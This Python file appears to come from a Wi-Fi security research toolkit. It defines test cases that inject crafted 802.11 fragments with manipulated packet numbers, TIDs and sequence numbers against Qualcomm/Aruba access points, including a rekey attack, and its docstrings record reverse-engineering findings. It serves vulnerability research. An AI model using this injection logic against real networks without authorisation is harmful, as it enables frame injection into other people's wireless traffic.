# Copyright (c) 2020, Mathy Vanhoef <mathy.vanhoef@nyu.edu>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

from fraginternals import *

class QcaDriverTest(Test):
	"""
	Against the Aruba AP we cannot send a normal frame between two fragments. Reverse engineering
	showed that the normal frame causes the fragment cache to be cleared on the AP, even before
	the raw fragment(s) are forwarded to the controller.

	We tried to work around this by injecting the normal frame (e.g. an EAPOL frame we want to inject
	in between fragments) as a fragmented frame as well. As a result, the fragment cache will not
	be cleared.

	Although the above avoids the fragment cache from being cleared, the Aruba AP still may not
	reassemble the fragments. This is because the second fragment may now have a higher packet number
	compared to the fragmented frames we injected in between (it seems no per-QoS replay counter
	is being used by them). So we must assure packet numbers are higher than the previous frame(s)
	NOT at the time of reception, but at the time of defragmentation (i.e. once all fragments arrived).

	But even with all this, the big issue is that the AP will queue all frames untill all fragments
	are collected. So the very first fragment we inject, will only arrive at the AP *after* the
	other fragments. And that makes this technique fairly useless. We tried to work around this in
	another way in QcaDriverSplit().
	"""
	def __init__(self):
		super().__init__([Action(Action.Connected, Action.GetIp),
				  Action(Action.Connected, enc=True, inc_pn=2, delay=0.2), # 102
				  Action(Action.Connected, enc=True, inc_pn=-2),	   # 100
				  Action(Action.Connected, enc=True, inc_pn=1),		   # 101
				  Action(Action.Connected, enc=True, inc_pn=2, delay=2)])  # 103
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		log(STATUS, "Generating QCA driver test", color="green")

		# Generate the header and payload
		header1, request1, self.check_fn = generate_request(station, REQ_ICMP, prior=2)
		header2, request2, self.check_fn = generate_request(station, REQ_ICMP, prior=4)
		header1.SC = 10 << 4
		header2.SC = 20 << 4

		# Generate all the individual (fragmented) frames
		frames1 = create_fragments(header1, request1, 2)
		frames2 = create_fragments(header2, request2, 2)

		self.actions[0].frame = frames1[0]
		self.actions[1].frame = frames2[0]
		self.actions[2].frame = frames2[1]
		self.actions[3].frame = frames1[1]


class QcaTestSplit(Test):
	"""
	Mixed encrypted and plaintext are both queued in ol_rx_reorder_store_frag,
	and both forwarded when all fragments are collected. So the idea is to send
	one fragment in plaintext, and one encrypted, under the same sequence number.
	This will cause ol_rx_reorder_store_frag to forward both fragments to the
	controller that will perform the actual defragmentation. Essential remarks:

	- Sending [Encrypted, Plaintext] and [Plaintext, Encrypted] failed. It is
	  not clear why this is the case. It could be that the second Plaintext fragment
	  might be overwriting the first Encrypted fragment. And it depends on whether
	  the controller rejects plaintext fragments.

	- You must send [Plaintext, Encrypted2] and [Encrypted1, Plaintext]. Note that
	  we first inject Encrypted2, which has a *higher* packet number than Encrypted1.
	  Without adhering to this order, the fragments will not be reassembled.

	- The Packet Number of the frame injected in between the two fragment pairs
	  must be *lower* than the Packet Numbers of both Encrypted fragments. Otherwise
	  the fragments will not be reassembled. This means the fragmented frames are
	  processed after the full frame! So the first encrypted fragment does not
	  seem to be immediately decrypted... this is problematic for the rekey attack,
	  since it seems both fragments are only processed once they are both at the
	  controller as well.

	- This test currently requires manual verification in Wireshark to assure that
	  a reply is received to *BOTH* pings.

	- At the controller, two fragments with a different QoS TID will be reassembled.
	  So only the sequence number matters. This is in constrast with the AP where
	  the TID does influence the queue a fragment is put on. So the defragmentation
	  code (and the queue design) is different between the AP and controller.
	"""
	def __init__(self):
		super().__init__([Action(Action.Connected, Action.GetIp),
			  Action(Action.Connected, enc=False, delay=0.2), # 100 (dropped b/c plaintext)
			  Action(Action.Connected, enc=True, inc_pn=5),	  # 105

			  Action(Action.Connected, enc=True, inc_pn=-2),  # 103

			  Action(Action.Connected, enc=True, inc_pn=1),   # 104
			  Action(Action.Connected, enc=False)])	   	  # 112 (dropped b plaintext)
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		log(STATUS, "Generating QCA driver test", color="green")

		# Generate the header and payload
		header1, request1, self.check_fn = generate_request(station, REQ_ICMP, prior=2)
		header2, request2, self.check_fn = generate_request(station, REQ_ICMP, prior=2)
		header1.SC = 10 << 4
		header2.SC = 10 << 4

		# Generate all the individual (fragmented) frames
		frames1 = create_fragments(header1, request1 / Raw(b"1"), 2)
		frames2 = create_fragments(header2, request2 / Raw(b"2"), 2)

		self.actions[0].frame = frames1[0]
		self.actions[1].frame = frames2[1]
		self.actions[3].frame = frames2[0]
		self.actions[4].frame = frames1[1]

		self.actions[0].frame.TID = 4
		self.actions[1].frame.TID = 4
		self.actions[3].frame.TID = 6
		self.actions[4].frame.TID = 6

		# Frame to put in between them
		if False:
			self.actions[2].frame = station.get_header(seqnum=11, prior=4)/LLC()/SNAP()/IP()
		else:
			header, request, self.check_fn = generate_request(station, REQ_ICMP, prior=2)
			header.SC = 11 << 4
			self.actions[2].frame = header/request/Raw(b"3")

		#self.actions[2].frame.addr3 = "ff:ff:ff:ff:ff:ff"


class QcaDriverRekey(Test):
	"""
	This attack fails because of the reasons discussed in QcaDriverSplit().
	Summarized, the two fragments still seem to be queued by the controller,
	meaning they are likely both still decrypted using the same (new) key.
	"""

	def __init__(self):
		super().__init__([Action(Action.Connected, Action.GetIp),
				  Action(Action.Connected, Action.Rekey),

				  Action(Action.BeforeAuth, enc=False, delay=0.2), 	#     | dropped b/c plaintext
				  Action(Action.BeforeAuth, enc=True, inc_pn=5),	# 105 | first fragment of ping

				  Action(Action.BeforeAuth, func=self.save_msg4),	#     | Save Msg4 so we control PN
				  Action(Action.BeforeAuth, enc=True, inc_pn=-2),  	# 103 | Msg4

				  Action(Action.BeforeAuth, func=self.get_key),		#     | We get the new key immediately
				  Action(Action.BeforeAuth, enc=True, inc_pn=1),	# 104 | second fragment of ping
				  Action(Action.BeforeAuth, enc=False)])	   	#     | dropped b plaintext

		self.check_fn = None

	def save_msg4(self, station, eapol):
		header = station.get_header(prior=4)
		header.SC = 11 << 4

		payload = LLC()/SNAP()/eapol

		# Only the last BeforeAuth trigger is remaining
		self.actions[0].frame = header/payload

	def get_key(self, station, eapol):
		station.update_keys()

		# Prevent Station code from sending the EAPOL frame
		return True

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def prepare(self, station):
		log(STATUS, "Generating QCA driver test", color="green")

		# Generate the header and payload
		header1, request1, self.check_fn = generate_request(station, REQ_ICMP, prior=2)
		header2, request2, self.check_fn = generate_request(station, REQ_ICMP, prior=2)
		header1.SC = 10 << 4
		header2.SC = 10 << 4

		# Generate all the individual (fragmented) frames
		frames1 = create_fragments(header1, request1 / Raw(b"1"), 2)
		frames2 = create_fragments(header2, request2 / Raw(b"2"), 2)

		# All Connected actions have been popped by now
		self.actions[0].frame = frames1[0] # hopefully dropped
		self.actions[1].frame = frames2[1]
		self.actions[5].frame = frames2[0]
		self.actions[6].frame = frames1[1] # hopefully dropped

